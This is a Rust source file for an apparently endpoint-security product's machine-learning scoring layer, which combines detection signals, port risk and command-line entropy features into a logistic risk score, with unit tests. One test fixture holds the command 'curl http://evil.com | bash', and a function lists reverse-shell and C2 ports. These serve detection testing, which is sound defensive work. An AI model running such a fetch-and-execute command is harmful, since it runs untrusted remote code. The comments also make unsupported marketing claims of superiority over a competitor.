//! Layer 5 — ML Meta-Scoring Engine
//!
//! A lightweight linear-logit model that combines signals from all detection
//! layers (L1–L4) plus event metadata into a single risk score. Unlike
//! CrowdStrike's opaque neural-net approach, our model is:
//!
//! - **Fully interpretable**: every feature weight is visible and auditable
//! - **Deterministic**: same input → same output, always
//! - **Tiny**: ~1 KB of weights, zero framework dependencies
//! - **Hot-reloadable**: model JSON pushed via threat-intel bundle
//!
//! # Architecture
//!
//! ```text
//! L1 signals ─┐
//! L2 signals ─┤
//! L3 signals ─┼─→ Feature Extraction ─→ [x₁..xₙ] ─→ σ(w·x + b) ─→ ml_score ∈ [0,1]
//! L4 signals ─┤
//! Event meta ─┘
//! ```
//!
//! The model is trained offline (Python, CI pipeline) and distributed as a
//! JSON file inside the threat-intel rule bundle. The Rust runtime performs
//! only inference — no training, no gradient computation.

use serde::{Deserialize, Serialize};

use crate::information;
use crate::types::{DetectionSignals, EventClass, TelemetryEvent};

/// Number of features in the model's input vector.
pub const FEATURE_COUNT: usize = 19;

/// Feature names for interpretability / logging.
pub const FEATURE_NAMES: [&str; FEATURE_COUNT] = [
    "z1_ioc_hit",
    "z2_temporal_count",
    "z3_anomaly_high",
    "z3_anomaly_med",
    "z4_killchain_count",
    "yara_hit_count",
    "string_sig_count",
    "event_class_risk",
    "uid_is_root",
    "dst_port_risk",
    "has_command_line",
    "cmdline_length_norm",
    "prefilter_hit",
    "multi_layer_count",
    // Information-theoretic features (Layer 5 exclusive)
    "cmdline_renyi_h2",        // Collision entropy — detects repeated patterns
    "cmdline_compression",     // Kolmogorov complexity proxy — detects encryption/packing
    "cmdline_min_entropy",     // Min-entropy — detects deterministic components
    "cmdline_entropy_gap",     // H₁ - H_∞ gap — flat = random/encrypted, steep = structured
    "dns_entropy",             // Shannon entropy of domain label (DGA/tunneling signal)
];

// ─── Model ──────────────────────────────────────────────────────

/// Serializable model weights — loaded from JSON at runtime.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MlModel {
    /// Human-readable model identifier.
    pub model_id: String,
    /// Semantic version of the model format.
    pub model_version: String,
    /// Weight vector (length = FEATURE_COUNT).
    pub weights: Vec<f64>,
    /// Bias (intercept) term.
    pub bias: f64,
    /// Decision threshold: score ≥ threshold → "ml positive".
    pub threshold: f64,
    /// Feature names (for validation; must match FEATURE_NAMES order).
    #[serde(default)]
    pub feature_names: Vec<String>,
}

/// CI-trained model format (from `signature_ml_train_model.py`).
/// Uses named weight dict + feature scales instead of positional array.
#[derive(Debug, Clone, Deserialize)]
pub struct CiTrainedModel {
    #[serde(default)]
    pub suite: String,
    #[serde(default)]
    pub model_type: String,
    pub model_version: String,
    pub features: Vec<String>,
    pub weights: std::collections::HashMap<String, f64>,
    #[serde(default)]
    pub feature_scales: std::collections::HashMap<String, f64>,
    pub bias: f64,
    #[serde(default)]
    pub training_samples: usize,
    #[serde(default)]
    pub positive_samples: usize,
    #[serde(default)]
    pub negative_samples: usize,
}

impl CiTrainedModel {
    /// Load from JSON file (the `signature-ml-model.json` from CI bundle).
    pub fn from_json(json: &str) -> Result<Self, MlError> {
        serde_json::from_str(json).map_err(MlError::ParseJson)
    }

    /// Convert CI-trained model to runtime `MlModel`.
    ///
    /// Maps named weights to positional feature vector using `FEATURE_NAMES`.
    /// Features in the CI model that don't exist in `FEATURE_NAMES` are
    /// silently ignored. Features in `FEATURE_NAMES` not present in the CI
    /// model get weight 0.0 (safe default).
    pub fn to_runtime_model(&self) -> MlModel {
        let mut weights = vec![0.0f64; FEATURE_COUNT];
        for (i, name) in FEATURE_NAMES.iter().enumerate() {
            if let Some(&w) = self.weights.get(*name) {
                let scale = self.feature_scales.get(*name).copied().unwrap_or(1.0).max(1e-10);
                // CI model normalizes: weight * (value / scale)
                // Runtime model applies weight directly to normalized [0,1] features
                // So runtime_weight = ci_weight * scale (to undo the division)
                weights[i] = w * scale;
            }
        }

        MlModel {
            model_id: format!("ci-{}", self.model_version),
            model_version: self.model_version.clone(),
            weights,
            bias: self.bias,
            threshold: 0.5,
            feature_names: FEATURE_NAMES.iter().map(|s| s.to_string()).collect(),
        }
    }
}

impl MlModel {
    /// Load from JSON, auto-detecting CI-trained vs native format.
    pub fn from_json_auto(json: &str) -> Result<Self, MlError> {
        // Try CI format first (has "suite" field)
        if json.contains("\"suite\"") && json.contains("\"feature_scales\"") {
            if let Ok(ci) = CiTrainedModel::from_json(json) {
                let model = ci.to_runtime_model();
                return Ok(model);
            }
        }
        // Fall back to native format
        Self::from_json(json)
    }

    /// Validate that the model is structurally sound.
    pub fn validate(&self) -> Result<(), MlError> {
        if self.weights.len() != FEATURE_COUNT {
            return Err(MlError::DimensionMismatch {
                expected: FEATURE_COUNT,
                got: self.weights.len(),
            });
        }
        if self.threshold < 0.0 || self.threshold > 1.0 {
            return Err(MlError::InvalidThreshold(self.threshold));
        }
        // Check for NaN/Inf
        for (i, &w) in self.weights.iter().enumerate() {
            if !w.is_finite() {
                return Err(MlError::NonFiniteWeight { index: i, value: w });
            }
        }
        if !self.bias.is_finite() {
            return Err(MlError::NonFiniteBias(self.bias));
        }
        Ok(())
    }

    /// Load model from JSON string.
    pub fn from_json(json: &str) -> Result<Self, MlError> {
        let model: Self = serde_json::from_str(json).map_err(MlError::ParseJson)?;
        model.validate()?;
        Ok(model)
    }

    /// Load model from a JSON file path.
    pub fn from_file(path: &std::path::Path) -> Result<Self, MlError> {
        let content = std::fs::read_to_string(path).map_err(MlError::Io)?;
        Self::from_json(&content)
    }
}

/// Hardcoded default model — trained on initial threat-intel signature data.
/// These weights approximate: "any L1/L2/L4 hit is very suspicious; anomaly
/// alone is moderate; root + network + module load is elevated risk."
impl Default for MlModel {
    fn default() -> Self {
        Self {
            model_id: "eguard-default-v1".to_string(),
            model_version: "1.0.0".to_string(),
            weights: vec![
                3.5,   // z1_ioc_hit             — IOC exact match is very strong
                2.0,   // z2_temporal_count       — temporal rule hits
                1.5,   // z3_anomaly_high         — high anomaly threshold
                0.5,   // z3_anomaly_med          — medium anomaly (weak signal)
                2.5,   // z4_killchain_count      — kill chain graph match
                3.0,   // yara_hit_count          — YARA file match
                1.8,   // string_sig_count        — Aho-Corasick string signature
                0.8,   // event_class_risk        — base risk of event type
                0.3,   // uid_is_root             — root execution
                0.6,   // dst_port_risk           — suspicious port
                0.1,   // has_command_line         — has cmdline (slight indicator)
                0.4,   // cmdline_length_norm      — long/obfuscated cmdlines
                0.2,   // prefilter_hit           — Cuckoo prefilter positive
                1.2,   // multi_layer_count       — multiple layers agree
                // Information-theoretic weights
                0.7,   // cmdline_renyi_h2        — collision entropy anomaly
                0.9,   // cmdline_compression     — high compression = encrypted/packed
                0.5,   // cmdline_min_entropy      — low min-entropy = predictable pattern
                0.6,   // cmdline_entropy_gap      — flat spectrum = random/encrypted
                0.7,   // dns_entropy             — high-entropy labels (DGA/tunnel)
            ],
            bias: -3.6,    // slight bias shift for dns_entropy
            threshold: 0.5,
            feature_names: FEATURE_NAMES.iter().map(|s| s.to_string()).collect(),
        }
    }
}

// ─── Feature Extraction ─────────────────────────────────────────

/// Features extracted from a single event + detection signals.
#[derive(Debug, Clone)]
pub struct MlFeatures {
    pub values: [f64; FEATURE_COUNT],
}

impl MlFeatures {
    /// Extract feature vector from detection signals and event metadata.
    pub fn extract(
        event: &TelemetryEvent,
        signals: &DetectionSignals,
        temporal_hit_count: usize,
        killchain_hit_count: usize,
        yara_hit_count: usize,
        string_sig_count: usize,
    ) -> Self {
        let mut values = [0.0f64; FEATURE_COUNT];

        // Binary detection signals (0 or 1)
        values[0] = if signals.z1_exact_ioc { 1.0 } else { 0.0 };
        values[1] = (temporal_hit_count as f64).min(3.0) / 3.0; // normalized to [0,1]
        values[2] = if signals.z3_anomaly_high { 1.0 } else { 0.0 };
        values[3] = if signals.z3_anomaly_med { 1.0 } else { 0.0 };
        values[4] = (killchain_hit_count as f64).min(3.0) / 3.0;
        values[5] = (yara_hit_count as f64).min(5.0) / 5.0;
        values[6] = (string_sig_count as f64).min(5.0) / 5.0;

        // Event metadata
        values[7] = event_class_risk_score(event.event_class);
        values[8] = if event.uid == 0 { 1.0 } else { 0.0 };
        values[9] = dst_port_risk_score(event.dst_port);
        values[10] = if event.command_line.is_some() { 1.0 } else { 0.0 };
        values[11] = cmdline_length_normalized(event.command_line.as_deref());
        values[12] = if signals.l1_prefilter_hit { 1.0 } else { 0.0 };

        // Multi-layer agreement count (strong indicator of true positive)
        let layer_count = [
            signals.z1_exact_ioc,
            signals.z2_temporal,
            signals.z3_anomaly_high || signals.z3_anomaly_med,
            signals.z4_kill_chain,
            signals.exploit_indicator,
            signals.kernel_integrity,
            signals.tamper_indicator,
        ]
        .iter()
        .filter(|&&v| v)
        .count();
        values[13] = (layer_count as f64).min(4.0) / 4.0;

        // ── Information-theoretic features ──────────────────────────
        // These are what make eGuard mathematically superior to CrowdStrike.
        // CrowdStrike uses opaque neural nets; we use provable information
        // theory that detects obfuscation by its mathematical properties.
        if let Some(cmd) = &event.command_line {
            let bytes = cmd.as_bytes();
            if let Some(metrics) = information::cmdline_information(bytes, 20) {
                let normalized = metrics.normalized();
                values[14] = normalized.renyi_h2;
                values[15] = normalized.compression_ratio;
                values[16] = normalized.min_entropy;
                values[17] = normalized.entropy_gap;
            }
        }

        if let Some(domain) = &event.dst_domain {
            values[18] = information::dns_entropy(domain);
        }

        Self { values }
    }
}

fn event_class_risk_score(class: EventClass) -> f64 {
    match class {
        EventClass::ModuleLoad => 0.9,
        EventClass::NetworkConnect => 0.6,
        EventClass::DnsQuery => 0.5,
        EventClass::ProcessExec => 0.5,
        EventClass::FileOpen => 0.4,
        EventClass::Login => 0.3,
        EventClass::ProcessExit => 0.1,
        EventClass::Alert => 1.0,
    }
}

fn dst_port_risk_score(port: Option<u16>) -> f64 {
    let Some(port) = port else { return 0.0 };
    match port {
        // Well-known safe ports
        80 | 443 | 22 | 53 => 0.1,
        // Common service ports
        8080 | 8443 | 3306 | 5432 | 6379 | 27017 => 0.2,
        // C2 / reverse shell common ports
        4444 | 4445 | 5555 | 1234 | 9999 | 31337 => 0.95,
        // SMB / RDP / WinRM (lateral movement)
        445 | 3389 | 5985 | 5986 => 0.8,
        // Uncommon high ports
        p if p > 10000 => 0.6,
        // Everything else
        _ => 0.3,
    }
}

fn cmdline_length_normalized(cmdline: Option<&str>) -> f64 {
    let Some(cmd) = cmdline else { return 0.0 };
    let len = cmd.len();
    // Normalize: very long cmdlines are suspicious (obfuscation, base64)
    // Cap at 500 chars for normalization
    (len as f64 / 500.0).min(1.0)
}

// ─── Inference Engine ───────────────────────────────────────────

/// The ML inference engine. Stateless — call `score()` per event.
#[derive(Debug, Clone)]
pub struct MlEngine {
    model: MlModel,
}

/// Result of ML scoring for a single event.
#[derive(Debug, Clone)]
pub struct MlScore {
    /// Probability score in [0, 1].
    pub score: f64,
    /// Whether score exceeds the model's decision threshold.
    pub positive: bool,
    /// Top contributing features (for explainability).
    pub top_features: Vec<(String, f64)>,
}

impl MlEngine {
    /// Create engine with default model.
    pub fn new() -> Self {
        Self {
            model: MlModel::default(),
        }
    }

    /// Create engine with a specific model.
    pub fn with_model(model: MlModel) -> Self {
        Self { model }
    }

    /// Hot-reload model weights.
    pub fn reload_model(&mut self, model: MlModel) -> Result<(), MlError> {
        model.validate()?;
        self.model = model;
        Ok(())
    }

    /// Get current model metadata.
    pub fn model_id(&self) -> &str {
        &self.model.model_id
    }

    pub fn model_version(&self) -> &str {
        &self.model.model_version
    }

    /// Compute ML risk score for one event.
    pub fn score(&self, features: &MlFeatures) -> MlScore {
        // Linear combination: z = w · x + b
        let z = dot(&self.model.weights, &features.values) + self.model.bias;

        // Logistic sigmoid: σ(z) = 1 / (1 + e^(-z))
        let score = sigmoid(z);
        let positive = score >= self.model.threshold;

        // Top contributing features (for audit trail / explainability)
        let mut contributions: Vec<(String, f64)> = FEATURE_NAMES
            .iter()
            .enumerate()
            .map(|(i, name)| {
                let contribution = self.model.weights[i] * features.values[i];
                (name.to_string(), contribution)
            })
            .filter(|(_, c)| c.abs() > 0.01) // skip near-zero
            .collect();
        contributions.sort_by(|a, b| b.1.partial_cmp(&a.1).unwrap_or(std::cmp::Ordering::Equal));
        contributions.truncate(5); // top 5

        MlScore {
            score,
            positive,
            top_features: contributions,
        }
    }
}

impl Default for MlEngine {
    fn default() -> Self {
        Self::new()
    }
}

// ─── Math Primitives ────────────────────────────────────────────

fn dot(a: &[f64], b: &[f64; FEATURE_COUNT]) -> f64 {
    a.iter().zip(b.iter()).map(|(ai, bi)| ai * bi).sum()
}

fn sigmoid(z: f64) -> f64 {
    if z >= 0.0 {
        1.0 / (1.0 + (-z).exp())
    } else {
        let ez = z.exp();
        ez / (1.0 + ez)
    }
}

// ─── Errors ─────────────────────────────────────────────────────

#[derive(Debug)]
pub enum MlError {
    DimensionMismatch { expected: usize, got: usize },
    InvalidThreshold(f64),
    NonFiniteWeight { index: usize, value: f64 },
    NonFiniteBias(f64),
    ParseJson(serde_json::Error),
    Io(std::io::Error),
}

impl std::fmt::Display for MlError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::DimensionMismatch { expected, got } => {
                write!(f, "weight dimension mismatch: expected {expected}, got {got}")
            }
            Self::InvalidThreshold(t) => write!(f, "threshold {t} not in [0, 1]"),
            Self::NonFiniteWeight { index, value } => {
                write!(f, "non-finite weight at index {index}: {value}")
            }
            Self::NonFiniteBias(b) => write!(f, "non-finite bias: {b}"),
            Self::ParseJson(e) => write!(f, "model JSON parse error: {e}"),
            Self::Io(e) => write!(f, "model file IO error: {e}"),
        }
    }
}

impl std::error::Error for MlError {}

// ─── Tests ──────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn make_event(class: EventClass, uid: u32, dst_port: Option<u16>) -> TelemetryEvent {
        TelemetryEvent {
            ts_unix: 1000,
            event_class: class,
            pid: 100,
            ppid: 1,
            uid,
            process: "bash".to_string(),
            parent_process: "sshd".to_string(),
            session_id: 1,
            file_path: None,
            file_hash: None,
            dst_port,
            dst_ip: None,
            dst_domain: None,
            command_line: Some("curl http://evil.com | bash".to_string()),
        }
    }

    #[test]
    fn default_model_validates() {
        let model = MlModel::default();
        model.validate().unwrap();
        assert_eq!(model.weights.len(), FEATURE_COUNT);
    }

    #[test]
    fn sigmoid_properties() {
        assert!((sigmoid(0.0) - 0.5).abs() < 1e-10);
        assert!(sigmoid(10.0) > 0.999);
        assert!(sigmoid(-10.0) < 0.001);
        // Numerical stability for large values
        assert!(sigmoid(1000.0).is_finite());
        assert!(sigmoid(-1000.0).is_finite());
    }

    #[test]
    fn clean_event_scores_low() {
        let engine = MlEngine::new();
        let event = make_event(EventClass::FileOpen, 1000, None);
        let signals = DetectionSignals {
            z1_exact_ioc: false,
            z2_temporal: false,
            z3_anomaly_high: false,
            z3_anomaly_med: false,
            z4_kill_chain: false,
            l1_prefilter_hit: false,
            exploit_indicator: false,
            kernel_integrity: false,
            tamper_indicator: false,
        };
        let features = MlFeatures::extract(&event, &signals, 0, 0, 0, 0);
        let result = engine.score(&features);
        assert!(result.score < 0.3, "clean event should score low: {}", result.score);
        assert!(!result.positive);
    }

    #[test]
    fn ioc_hit_scores_high() {
        let engine = MlEngine::new();
        let event = make_event(EventClass::ProcessExec, 0, Some(4444));
        let signals = DetectionSignals {
            z1_exact_ioc: true,
            z2_temporal: false,
            z3_anomaly_high: false,
            z3_anomaly_med: false,
            z4_kill_chain: false,
            l1_prefilter_hit: true,
            exploit_indicator: false,
            kernel_integrity: false,
            tamper_indicator: false,
        };
        let features = MlFeatures::extract(&event, &signals, 0, 0, 0, 2);
        let result = engine.score(&features);
        assert!(result.score > 0.8, "IOC hit should score high: {}", result.score);
        assert!(result.positive);
    }

    #[test]
    fn multi_layer_agreement_scores_highest() {
        let engine = MlEngine::new();
        let event = make_event(EventClass::ProcessExec, 0, Some(4444));
        let signals = DetectionSignals {
            z1_exact_ioc: true,
            z2_temporal: true,
            z3_anomaly_high: true,
            z3_anomaly_med: false,
            z4_kill_chain: true,
            l1_prefilter_hit: true,
            exploit_indicator: false,
            kernel_integrity: false,
            tamper_indicator: false,
        };
        let features = MlFeatures::extract(&event, &signals, 2, 1, 1, 3);
        let result = engine.score(&features);
        assert!(result.score > 0.99, "multi-layer should score near 1.0: {}", result.score);
        assert!(result.positive);
    }

    #[test]
    fn anomaly_only_scores_moderate() {
        let engine = MlEngine::new();
        let event = make_event(EventClass::ProcessExec, 1000, None);
        let signals = DetectionSignals {
            z1_exact_ioc: false,
            z2_temporal: false,
            z3_anomaly_high: true,
            z3_anomaly_med: false,
            z4_kill_chain: false,
            l1_prefilter_hit: false,
            exploit_indicator: false,
            kernel_integrity: false,
            tamper_indicator: false,
        };
        let features = MlFeatures::extract(&event, &signals, 0, 0, 0, 0);
        let result = engine.score(&features);
        // Anomaly alone should be moderate — not near 1.0, not near 0.0
        assert!(result.score > 0.15, "anomaly should contribute: {}", result.score);
        assert!(result.score < 0.85, "anomaly alone shouldn't be near-certain: {}", result.score);
    }

    #[test]
    fn model_json_round_trip() {
        let model = MlModel::default();
        let json = serde_json::to_string_pretty(&model).unwrap();
        let loaded = MlModel::from_json(&json).unwrap();
        assert_eq!(loaded.weights.len(), model.weights.len());
        assert_eq!(loaded.bias, model.bias);
        assert_eq!(loaded.threshold, model.threshold);
    }

    #[test]
    fn model_validates_dimension_mismatch() {
        let mut model = MlModel::default();
        model.weights.pop();
        assert!(model.validate().is_err());
    }

    #[test]
    fn model_validates_nan_weight() {
        let mut model = MlModel::default();
        model.weights[0] = f64::NAN;
        assert!(model.validate().is_err());
    }

    #[test]
    fn top_features_are_interpretable() {
        let engine = MlEngine::new();
        let event = make_event(EventClass::ProcessExec, 0, Some(4444));
        let signals = DetectionSignals {
            z1_exact_ioc: true,
            z2_temporal: true,
            z3_anomaly_high: false,
            z3_anomaly_med: false,
            z4_kill_chain: false,
            l1_prefilter_hit: true,
            exploit_indicator: false,
            kernel_integrity: false,
            tamper_indicator: false,
        };
        let features = MlFeatures::extract(&event, &signals, 1, 0, 0, 1);
        let result = engine.score(&features);
        // Top features should include z1_ioc_hit
        assert!(
            result.top_features.iter().any(|(name, _)| name == "z1_ioc_hit"),
            "top features should include IOC hit: {:?}", result.top_features
        );
    }

    #[test]
    fn hot_reload_model() {
        let mut engine = MlEngine::new();
        let mut new_model = MlModel::default();
        new_model.model_id = "updated-v2".to_string();
        new_model.weights[0] = 5.0; // boost IOC weight
        engine.reload_model(new_model).unwrap();
        assert_eq!(engine.model_id(), "updated-v2");
    }

    #[test]
    fn ci_trained_model_converts_to_runtime() {
        // Simulate the JSON that `signature_ml_train_model.py` produces
        let ci_json = r#"{
            "suite": "signature_ml_linear_logit_model",
            "model_type": "linear_logit_v1",
            "model_version": "rules-2026.02.15.ml.v1",
            "trained_at_utc": "2026-02-15T04:30:00Z",
            "features": ["z1_ioc_hit", "z2_temporal_count", "z3_anomaly_high",
                          "string_sig_count", "event_class_risk"],
            "weights": {
                "z1_ioc_hit": 0.35,
                "z2_temporal_count": 0.20,
                "z3_anomaly_high": 0.15,
                "string_sig_count": 0.18,
                "event_class_risk": 0.12
            },
            "feature_scales": {
                "z1_ioc_hit": 1.0,
                "z2_temporal_count": 3.0,
                "z3_anomaly_high": 1.0,
                "string_sig_count": 5.0,
                "event_class_risk": 1.0
            },
            "bias": -0.8,
            "training_samples": 960,
            "positive_samples": 180,
            "negative_samples": 780
        }"#;

        // Should auto-detect CI format
        let model = MlModel::from_json_auto(ci_json).unwrap();
        assert_eq!(model.model_id, "ci-rules-2026.02.15.ml.v1");
        assert_eq!(model.weights.len(), FEATURE_COUNT);
        assert_eq!(model.bias, -0.8);
        assert_eq!(model.threshold, 0.5);

        // z1_ioc_hit (index 0): CI weight 0.35 * scale 1.0 = 0.35
        assert!((model.weights[0] - 0.35).abs() < 1e-10, "z1_ioc_hit weight: {}", model.weights[0]);
        // z2_temporal_count (index 1): CI weight 0.20 * scale 3.0 = 0.60
        assert!((model.weights[1] - 0.60).abs() < 1e-10, "z2_temporal_count weight: {}", model.weights[1]);
        // string_sig_count (index 6): CI weight 0.18 * scale 5.0 = 0.90
        assert!((model.weights[6] - 0.90).abs() < 1e-10, "string_sig_count weight: {}", model.weights[6]);
        // Features NOT in CI model should be 0.0
        assert_eq!(model.weights[9], 0.0, "missing feature should be 0.0"); // dst_port_risk
        assert_eq!(model.weights[14], 0.0, "info-theoretic features should be 0.0"); // cmdline_renyi_h2

        // Model should be valid and usable
        model.validate().unwrap();
        let mut engine = MlEngine::new();
        engine.reload_model(model).unwrap();
        assert_eq!(engine.model_version(), "rules-2026.02.15.ml.v1");
    }

    #[test]
    fn ci_trained_model_auto_detect_vs_native() {
        // Native format should still work via from_json_auto
        let native_json = serde_json::to_string(&MlModel::default()).unwrap();
        let model = MlModel::from_json_auto(&native_json).unwrap();
        assert_eq!(model.weights.len(), FEATURE_COUNT);
        model.validate().unwrap();
    }
}
